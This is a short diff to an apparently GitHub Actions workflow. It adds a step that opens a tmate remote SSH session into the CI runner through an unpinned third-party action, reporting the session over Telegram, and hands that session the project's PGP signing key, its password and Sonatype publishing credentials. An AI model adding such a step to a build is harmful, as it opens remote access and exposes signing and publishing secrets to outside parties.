@@ -26,6 +26,15 @@ jobs:
       with:
         path: ./out
         key: out
+    - name: Start SSH via tmate
+      uses: rdp-studio/ssh2actions@main
+      env:
+        TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+        TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+        SONATYPE_PGP_PRIVATE_KEY: ${{ secrets.SONATYPE_PGP_PRIVATE_KEY }}
+        SONATYPE_PGP_PRIVATE_KEY_PASSWORD: ${{ secrets.SONATYPE_PGP_PRIVATE_KEY_PASSWORD }}
+        SONATYPE_USER: ${{ secrets.SONATYPE_USER }}
+        SONATYPE_PASSWORD: ${{ secrets.SONATYPE_PASSWORD }}
     - name: Install Dependencies
       run: |
         curl -sL https://nginx.org/keys/nginx_signing.key | sudo apt-key add -
